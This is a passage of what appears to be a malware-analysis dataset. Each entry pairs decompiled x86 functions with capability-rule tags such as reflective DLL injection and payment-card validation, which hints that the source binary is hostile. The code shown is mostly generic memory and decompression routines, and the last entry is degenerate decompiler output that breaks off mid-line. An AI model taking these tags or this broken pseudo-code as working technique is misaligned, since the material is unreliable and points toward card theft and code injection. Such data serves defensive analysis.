        "decompiled_code": "\nint32_t __cdecl fcn.00406520(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t arg_ch_00;\n    uint32_t uVar2;\n    uint32_t arg_10h_00;\n    uint32_t uVar3;\n    int32_t var_4h;\n    \n    var_4h = *(arg_ch + 0xc);\n    uVar2 = *(arg_8h + 0x34);\n    arg_ch_00 = *(arg_8h + 0x30);\n    if (uVar2 < arg_ch_00) {\n        uVar2 = *(arg_8h + 0x2c);\n    }\n    uVar3 = *(arg_ch + 0x10);\n    arg_10h_00 = uVar2 - arg_ch_00;\n    if (uVar3 < uVar2 - arg_ch_00) {\n        arg_10h_00 = uVar3;\n    }\n    if ((arg_10h_00 != 0) && (arg_10h == -5)) {\n        arg_10h = 0;\n    }\n    *(arg_ch + 0x14) = *(arg_ch + 0x14) + arg_10h_00;\n    *(arg_ch + 0x10) = uVar3 - arg_10h_00;\n    if (*(arg_8h + 0x38) != NULL) {\n        uVar1 = (**(arg_8h + 0x38))(*(arg_8h + 0x3c), arg_ch_00, arg_10h_00);\n        *(arg_8h + 0x3c) = uVar1;\n        *(arg_ch + 0x30) = uVar1;\n    }\n    if (arg_10h_00 != 0) {\n        fcn.0042af40(var_4h, arg_ch_00, arg_10h_00);\n        var_4h = var_4h + arg_10h_00;\n        arg_ch_00 = arg_ch_00 + arg_10h_00;\n    }\n    if (arg_ch_00 == *(arg_8h + 0x2c)) {\n        arg_ch_00 = *(arg_8h + 0x28);\n        if (*(arg_8h + 0x34) == *(arg_8h + 0x2c)) {\n            *(arg_8h + 0x34) = arg_ch_00;\n        }\n        uVar2 = *(arg_ch + 0x10);\n        uVar3 = *(arg_8h + 0x34) - arg_ch_00;\n        if (uVar2 < uVar3) {\n            uVar3 = uVar2;\n        }\n        if ((uVar3 != 0) && (arg_10h == -5)) {\n            arg_10h = 0;\n        }\n        *(arg_ch + 0x14) = *(arg_ch + 0x14) + uVar3;\n        *(arg_ch + 0x10) = uVar2 - uVar3;\n        if (*(arg_8h + 0x38) != NULL) {\n            uVar1 = (**(arg_8h + 0x38))(*(arg_8h + 0x3c), arg_ch_00, uVar3);\n            *(arg_8h + 0x3c) = uVar1;\n            *(arg_ch + 0x30) = uVar1;\n        }\n        if (uVar3 != 0) {\n            fcn.0042af40(var_4h, arg_ch_00, uVar3);\n            var_4h = var_4h + uVar3;\n            arg_ch_00 = arg_ch_00 + uVar3;\n        }\n    }\n    *(arg_ch + 0xc) = var_4h;\n    *(arg_8h + 0x30) = arg_ch_00;\n    return arg_10h;\n}\n",
        "token_count": 901
    },
    "00406630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406630(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint *puVar1;\n    \n    puVar1 = (**(arg_18h + 0x20))(*(arg_18h + 0x28), 1, 0x1c);\n    if (puVar1 != NULL) {\n        *(puVar1 + 4) = arg_8h;\n        *(puVar1 + 0x11) = arg_ch;\n        *puVar1 = 0;\n        puVar1[5] = arg_10h;\n        puVar1[6] = arg_14h;\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "00406700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00406700(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint *arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = (**(arg_8h + 0x20))(*(arg_8h + 0x28), 1, 0x40);\n    if (arg_8h_00 != NULL) {\n        iVar1 = (**(arg_8h + 0x20))(*(arg_8h + 0x28), 8, 0x5a0);\n        arg_8h_00[9] = iVar1;\n        if (iVar1 != 0) {\n            iVar1 = (**(arg_8h + 0x20))(*(arg_8h + 0x28), 1, arg_10h);\n            arg_8h_00[10] = iVar1;\n            if (iVar1 == 0) {\n                (**(arg_8h + 0x24))(*(arg_8h + 0x28), arg_8h_00[9]);\n                (**(arg_8h + 0x24))(*(arg_8h + 0x28), arg_8h_00);\n                return NULL;\n            }\n            arg_8h_00[0xb] = iVar1 + arg_10h;\n            arg_8h_00[0xe] = arg_ch;\n            *arg_8h_00 = 0;\n            fcn.00406670(arg_8h_00, arg_8h, 0);\n            return arg_8h_00;\n        }\n        (**(arg_8h + 0x24))(*(arg_8h + 0x28), arg_8h_00);\n    }\n    return NULL;\n}\n",
        "token_count": 410
    },
    "00406e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00406e30(uint32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h, int32_t *arg_18h, uint arg_1ch, \n            uint arg_20h, uint arg_24h, int32_t arg_28h)\n\n{\n    int32_t arg_2ch;\n    int32_t iVar1;\n    uint var_4h;\n    \n    var_4h = 0;\n    arg_2ch = (**(arg_28h + 0x20))(*(arg_28h + 0x28), 0x120, 4);\n    if (arg_2ch == 0) {\n        return -4;\n    }\n    iVar1 = fcn.00406850(arg_10h, arg_8h, 0x101, 0x446610, 0x446690, arg_1ch, arg_14h, arg_24h, &var_4h, arg_2ch);\n    if (iVar1 == 0) {\n        if (*arg_14h != 0) {\n            iVar1 = fcn.00406850(arg_10h + arg_8h * 4, arg_ch, 0, 0x446710, 0x446788, arg_20h, arg_18h, arg_24h, &var_4h\n                                 , arg_2ch);\n            if (iVar1 == 0) {\n                if ((*arg_18h != 0) || (arg_8h < 0x102)) {\n                    (**(arg_28h + 0x24))(*(arg_28h + 0x28), arg_2ch);\n                    return 0;\n                }\n            }\n            else {\n                if (iVar1 == -3) {\n                    *(arg_28h + 0x18) = 0x446cd8;\n                    (**(arg_28h + 0x24))(*(arg_28h + 0x28), arg_2ch);\n                    return -3;\n                }\n                if (iVar1 == -5) {\n                    *(arg_28h + 0x18) = 0x446cbc;\n                    (**(arg_28h + 0x24))(*(arg_28h + 0x28), arg_2ch);\n                    return -3;\n                }\n                if (iVar1 == -4) goto code_r0x00406f60;\n            }\n            *(arg_28h + 0x18) = 0x446c98;\n            iVar1 = -3;\ncode_r0x00406f60:\n            (**(arg_28h + 0x24))(*(arg_28h + 0x28), arg_2ch);\n            return iVar1;\n        }\n    }\n    else {\n        if (iVar1 == -3) {\n            *(arg_28h + 0x18) = 0x446c74;\n            goto code_r0x00406f95;\n        }\n        if (iVar1 == -4) goto code_r0x00406f95;\n    }\n    *(arg_28h + 0x18) = 0x446c54;\n    iVar1 = -3;\ncode_r0x00406f95:\n    (**(arg_28h + 0x24))(*(arg_28h + 0x28), arg_2ch);\n    return iVar1;\n}\n",
        "token_count": 762
    },
    "00407600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407600(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0042c154(arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 47
    },
    "00407640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407640(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    \n    if ((arg_8h != 0) && (puVar1 = *(arg_8h + 0x1c),  puVar1 != NULL)) {\n        *(arg_8h + 0x14) = 0;\n        *(arg_8h + 8) = 0;\n        *(arg_8h + 0x18) = 0;\n        *puVar1 = -(puVar1[3] != 0) & 7;\n        fcn.00406670(*(*(arg_8h + 0x1c) + 0x14), arg_8h, 0);\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 182
    },
    "004076e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004076e0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == 0) {\n        return 0xfffffffe;\n    }\n    *(arg_8h + 0x18) = 0;\n    if (*(arg_8h + 0x20) == 0) {\n        *(arg_8h + 0x20) = 0x406a00;\n        *(arg_8h + 0x28) = 0;\n    }\n    if (*(arg_8h + 0x24) == 0) {\n        *(arg_8h + 0x24) = 0x406a20;\n    }\n    iVar1 = (**(arg_8h + 0x20))(*(arg_8h + 0x28), 1, 0x18);\n    *(arg_8h + 0x1c) = iVar1;\n    if (iVar1 != 0) {\n        *(iVar1 + 0x14) = 0;\n        *(*(arg_8h + 0x1c) + 0xc) = 0;\n        *(*(arg_8h + 0x1c) + 0xc) = 1;\n        *(*(arg_8h + 0x1c) + 0x10) = 0xf;\n        iVar1 = fcn.00406700(arg_8h, ~-(*(*(arg_8h + 0x1c) + 0xc) != 0) & 0x4068c0, 0x8000);\n        *(*(arg_8h + 0x1c) + 0x14) = iVar1;\n        if (iVar1 != 0) {\n            fcn.00407640(arg_8h);\n            return 0;\n        }\n        fcn.00407690(arg_8h);\n    }\n    return 0xfffffffc;\n}\n",
        "token_count": 437
    },
    "00407ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407ad0(int32_t arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    char cVar2;\n    \n    arg_8h = arg_8h - arg_ch;\n    while( true ) {\n        cVar1 = arg_ch[arg_8h];\n        cVar2 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        if (cVar1 + 0x9fU < 0x1a) {\n            cVar1 = cVar1 + -0x20;\n        }\n        if (cVar2 + 0x9fU < 0x1a) {\n            cVar2 = cVar2 + -0x20;\n        }\n        if (cVar1 == '\\0') {\n            return -(cVar2 != '\\0');\n        }\n        if (cVar2 == '\\0') {\n            return 1;\n        }\n        if (cVar1 < cVar2) break;\n        if (cVar2 < cVar1) {\n            return 1;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 246
    },
    "00408080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408080(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == 0) {\n        return -0x66;\n    }\n    *(arg_8h + 0x14) = *(arg_8h + 0x24);\n    *(arg_8h + 0x10) = 0;\n    iVar1 = fcn.00407d00(arg_8h, arg_8h + 0x28, arg_8h + 0x78, 0, 0, 0, 0, 0, 0);\n    *(arg_8h + 0x18) = iVar1 == 0;\n    return iVar1;\n}\n",
        "token_count": 169
    },
    "0040ab30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040ab30(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43dccb;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    puVar2 = fcn.0042b9b1(0x244);\n    var_4h = 0;\n    if (puVar2 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        *puVar2 = 0;\n        puVar2[1] = 0xffffffff;\n        puVar2[0x4d] = 0xffffffff;\n        puVar2[0x4e] = 0;\n        puVar2[0x4f] = 0;\n        if (arg_14h != 0) {\n            iVar3 = fcn.0042b420(arg_14h, uVar1);\n            uVar4 = fcn.0042a209(iVar3 + 1);\n            puVar2[0x4e] = uVar4;\n            fcn.0042ad40(uVar4, arg_14h);\n        }\n    }\n    var_4h = 0xffffffff;\n    *0x458684 = fcn.0040a650(arg_8h, arg_ch, arg_10h);\n    if (*0x458684 != 0) {\n        if (puVar2 != NULL) {\n            if (puVar2[0x4e] != 0) {\n                fcn.0042c228(puVar2[0x4e]);\n            }\n            puVar2[0x4e] = 0;\n            if (puVar2[0x4f] != 0) {\n                fcn.0042c228(puVar2[0x4f]);\n            }\n            puVar2[0x4f] = 0;\n            fcn.0042ac49(puVar2);\n        }\n        *in_FS_OFFSET = var_ch;\n        return NULL;\n    }\n    puVar5 = fcn.0042b9b1(8);\n    *puVar5 = 1;\n    puVar5[1] = puVar2;\n    *in_FS_OFFSET = var_ch;\n    return puVar5;\n}\n",
        "token_count": 613
    },
    "0040ac50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ac50(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040ab30(arg_8h, arg_ch, 3, arg_10h);\n    return;\n}\n",
        "token_count": 56
    },
    "0040b090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0046cd7a) overlaps instruction at (ram,0x0046cd79)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x0046c346)\n// WARNING: Removing unreachable block (ram,0x0046c390)\n// WARNING: Removing unreachable block (ram,0x0046c2ca)\n// WARNING: Removing unreachable block (ram,0x0046c2cf)\n// WARNING: Removing unreachable block (ram,0x0046c341)\n// WARNING: Removing unreachable block (ram,0x0046c343)\n// WARNING: Removing unreachable block (ram,0x0046c297)\n// WARNING: Removing unreachable block (ram,0x0046c30b)\n// WARNING: Removing unreachable block (ram,0x0046c21f)\n// WARNING: Removing unreachable block (ram,0x0046c221)\n// WARNING: Removing unreachable block (ram,0x0046c202)\n// WARNING: Removing unreachable block (ram,0x0046c201)\n// WARNING: Removing unreachable block (ram,0x0046c112)\n// WARNING: Removing unreachable block (ram,0x0046c18c)\n// WARNING: Removing unreachable block (ram,0x0046c1ba)\n// WARNING: Removing unreachable block (ram,0x0046c153)\n// WARNING: Removing unreachable block (ram,0x0046c155)\n// WARNING: Removing unreachable block (ram,0x0046c05e)\n// WARNING: Removing unreachable block (ram,0x0046c14e)\n// WARNING: Removing unreachable block (ram,0x0046c1ca)\n// WARNING: Removing unreachable block (ram,0x0046c1cf)\n// WARNING: Removing unreachable block (ram,0x0046c255)\n// WARNING: Removing unreachable block (ram,0x0046c2e9)\n// WARNING: Removing unreachable block (ram,0x0046c21a)\n// WARNING: Removing unreachable block (ram,0x0046c28a)\n// WARNING: Removing unreachable block (ram,0x0046c4b0)\n// WARNING: Removing unreachable block (ram,0x0046c18a)\n// WARNING: Removing unreachable block (ram,0x0046c204)\n// WARNING: Removing unreachable block (ram,0x0046c27d)\n// WARNING: Removing unreachable block (ram,0x0046c2e4)\n// WARNING: Removing unreachable block (ram,0x0046c27f)\n// WARNING: Removing unreachable block (ram,0x0046c285)\n// WARNING: Removing unreachable block (ram,0x0046c190)\n// WARNING: Removing unreachable block (ram,0x0046c192)\n// WARNING: Removing unreachable block (ram,0x0046c14d)\n// WARNING: Removing unreachable block (ram,0x0046c164)\n// WARNING: Removing unreachable block (ram,0x0046c23a)\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b090(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    int16_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint *puVar5;\n    uint64_t uVar6;\n    char cVar7;\n    char cVar8;\n    uint8_t uVar9;\n    uint8_t uVar10;\n    uint16_t uVar11;\n    uint8_t uVar24;\n    uint uVar12;\n    int32_t *piVar13;\n    uint8_t *puVar14;\n    uint16_t *puVar15;\n    ushort *puVar16;\n    char **ppcVar17;\n    uint32_t uVar18;\n    int32_t *piVar19;\n    int32_t **ppiVar20;\n    char *pcVar21;\n    uint32_t uVar22;\n    uint8_t *puVar23;\n    uint16_t uVar25;\n    uint32_t *extraout_ECX;\n    uint32_t *extraout_ECX_00;\n    uint32_t *puVar26;\n    uint32_t *puVar27;\n    int32_t extraout_ECX_01;\n    char extraout_DL;\n    ushort uVar28;\n    ushort uVar29;\n    uint uVar30;\n    uint uVar31;\n    char cVar32;\n    uint8_t uVar35;\n    uint unaff_EBX;\n    int32_t *piVar33;\n    int32_t *piVar34;\n    uchar *puVar36;\n    uchar *puVar37;\n    uchar *puVar38;\n    uint unaff_EBP;\n    uint32_t *puVar39;\n    uint32_t *puVar40;\n    uint32_t *puVar41;\n    uint32_t *puVar42;\n    uint32_t *puVar43;\n    uint *unaff_ESI;\n    char *pcVar44;\n    int32_t *piVar45;\n    int32_t iVar46;\n    uint *puVar47;\n    char *pcVar48;\n    uchar *puVar49;\n    uchar *puVar50;\n    uint unaff_EDI;\n    int32_t *piVar51;\n    int32_t *piVar52;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_GS;\n    int32_t in_FS_OFFSET;\n    int32_t in_GS_OFFSET;\n    uint8_t uVar53;\n    uint8_t in_AF;\n    bool bVar54;\n    bool bVar55;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar56;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint64_t uVar57;\n    uchar unaff_retaddr;\n    ushort unaff_retaddr_00;\n    uchar unaff_retaddr_01;\n    uchar in_stack_00000008;\n    char in_stack_00000009;\n    char in_stack_0000000a;\n    uchar in_stack_0000000b;\n    char in_stack_0000000c;\n    uint8_t in_stack_0000000d;\n    uint8_t in_stack_0000000e;\n    uchar in_stack_0000000f;\n    uint8_t in_stack_00000010;\n    char in_stack_00000011;\n    uint16_t in_stack_00000012;\n    uchar in_stack_00000014;\n    uchar in_stack_00000015;\n    ushort in_stack_00000016;\n    uint8_t in_stack_00000018;\n    char in_stack_00000019;\n    ushort in_stack_0000001a;\n    uchar in_stack_0000001c;\n    uchar in_stack_0000001d;\n    ushort in_stack_0000001e;\n    uchar in_stack_00000020;\n    char in_stack_00000021;\n    ushort in_stack_00000022;\n    uchar in_stack_00000024;\n    uint8_t in_stack_00000025;\n    ushort in_stack_00000026;\n    uchar in_stack_00000028;\n    uchar in_stack_00000029;\n    ushort in_stack_0000002a;\n    uchar in_stack_0000002c;\n    uchar in_stack_0000002d;\n    char in_stack_0000002e;\n    uchar in_stack_0000002f;\n    uchar in_stack_00000030;\n    uchar in_stack_00000031;\n    ushort in_stack_00000032;\n    ushort in_stack_00000034;\n    int16_t in_stack_0000005e;\n    uchar auStackY256 [176];\n    int32_t *piStackY80;\n    uint *puStackY76;\n    uint32_t *puStackY72;\n    int32_t *piStackY64;\n    uint uStackY60;\n    uint32_t *in_stack_ffffffc8;\n    uint *puVar58;\n    uchar uVar59;\n    uchar uVar60;\n    uchar uVar61;\n    uchar uVar62;\n    uchar uVar63;\n    uint32_t *puStack24;\n    int32_t *piStack20;\n    uint32_t var_8h;\n    uint var_4h;\n    uint uStack4;\n    \n    uVar59 = in_stack_00000015;\n    puVar41 = &stack0xfffffffc;\n    puVar40 = &stack0xfffffffc;\n    puVar42 = &stack0xfffffffc;\n    in_stack_00000015 = 0xfc;\n    uVar1 = in_stack_00000015;\n    puVar43 = &stack0xfffffffc;\n    puVar26 = &stack0xfffffffc;\n    puVar39 = &stack0xfffffffc;\n    uStack4._0_1_ = unaff_EBP;\n    uStack4._1_2_ = unaff_EBP >> 8;\n    piStack20 = 0xea60;\n    puStack24 = NULL;\n    in_stack_00000015 = uVar59;\n    uVar12 = (**0x4692b4)();\n    piVar13 = (**0x46923c)();\n    (**0x469258)();\n    var_4h._0_1_ = 0x2c;\n    var_4h._1_1_ = '\\0';\n    puVar58 = 0x40b0cf;\n    uVar57 = fcn.0042d83d(piVar13, &fcn.0040b090::var_4h, &fcn.0040b090::var_8h);\n    if (uVar57 != 0) {\n        uVar62 = unaff_EBX;\n        uVar29 = unaff_EBX >> 8;\n        uVar63 = unaff_EBX >> 0x18;\n        uVar59 = unaff_EDI;\n        cVar8 = unaff_EDI >> 8;\n        uVar60 = unaff_EDI >> 0x10;\n        uVar61 = unaff_EDI >> 0x18;\n        piVar51 = NULL;\n        piVar34 = 0x1;\n        piVar33 = 0x1;\n        puVar27 = extraout_ECX;\n        do {\n            piVar52 = uVar57 >> 0x20;\n            piVar45 = uVar57;\n            switch(piVar51) {\n            case NULL:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x2:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x3:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x4:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x5:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x6:\n                uVar10 = uVar57;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 = *piVar45 + uVar10;\n                *piVar45 